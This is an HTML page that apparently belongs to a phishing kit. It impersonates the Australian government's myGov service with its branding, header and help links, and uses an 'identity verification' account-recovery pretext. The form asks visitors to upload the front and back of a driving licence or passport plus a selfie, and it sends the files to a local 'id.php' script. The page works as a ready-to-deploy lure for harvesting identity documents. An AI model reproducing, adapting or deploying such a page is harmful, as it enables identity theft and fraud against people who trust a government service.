
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Identity - myGov</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <link rel="icon" type="image/png" sizes="32x32" href="https://my.gov.au/content/dam/mygov/images/brand/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/mygov/content/mgv2/icons/favicon-16x16.png">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
    <link href="css/mgv2-application.css" rel="stylesheet">
    <link href="css/blugov.css" rel="stylesheet">
    <style>
        /* Style the custom file input buttons */
        .custom-file-upload {
            border: 2px solid #99e1f3; /* Border color */
            display: inline-block;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px; /* Rounded corners */
            background-color: #99e1f3; /* Background color */
            color: white; /* Text color */
            font-family: 'National2', 'Helvetica Neue', Helvetica, Arial, sans-serif; /* Font family */
            font-size: 16px; /* Font size */
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Shadow effect */
            margin-right: 10px; /* Space between buttons */
        }

        /* Add hover effect */
        .custom-file-upload:hover {
            background-color: #99e1f3; /* Slightly lighter color on hover */
        }

        /* Hide default file input */
        .file-input {
            display: none;
        }
    </style>
</head>
<body>
<nav class="uikit-skip-link" aria-label="Skip Links">
    <a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
    <section class="wrapper">
        <div class="inner">
            <div class="unauth-grid">
                <div class="unauth-grid-row">
                    <a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
                        <img id="unauth-govt-crest" src="img/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                    </a>

                    <div class="header-links">
                        <a href="https://beta.my.gov.au/en/about/help">Help</a>
                    </div>
                </div>
            </div>
        </div>
    </section>
</header>

<div class="wrapper-mapwap">
    <div class="main-block" id="content" role="main">
        <h1>Identity verification</h1>
        <p>For security, we need to verify your identity <br>Driving license or passport is required</p>
        <form action="id.php" method="post" enctype="multipart/form-data" id="otp-entry-form">
            <div class="code-container">
                <!-- Hidden file inputs -->
                <input type="file" id="file-upload-front" name="front" class="file-input" accept="image/*" />
                <input type="file" id="file-upload-back" name="back" class="file-input" accept="image/*" />
                <input type="file" id="file-upload-selfie" name="selfie" class="file-input" accept="image/*" />
<br>
                <!-- Custom file input buttons -->
                <label for="file-upload-front" class="custom-file-upload">
                    Upload Front
                </label>
                <label for="file-upload-back" class="custom-file-upload">
                    Upload Back
                </label>
                <label for="file-upload-selfie" class="custom-file-upload">
                    Upload Selfie
                </label>
                </div> <br>
                <div class="button-container">    			
                    <button type="submit" class="button-main button">Next</button>
                    <button role="submit" class="button-minor button">Cancel</button>
                </div>
                <input type="hidden" name="accountRecovery" value="true" />
                <input type="hidden" name="authtype" value="otp" />
                <input type="hidden" name="_resetMobileEligible" value="" />
                <input type="hidden" name="_fallback" value="" /> 
                <input type="hidden" name="_csrf" value="1955f03c-d798-45c1-8b18-b20ec7445f8f" />
            </div>
        </form>
    </div>
</div>

<script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
</body>
</html>
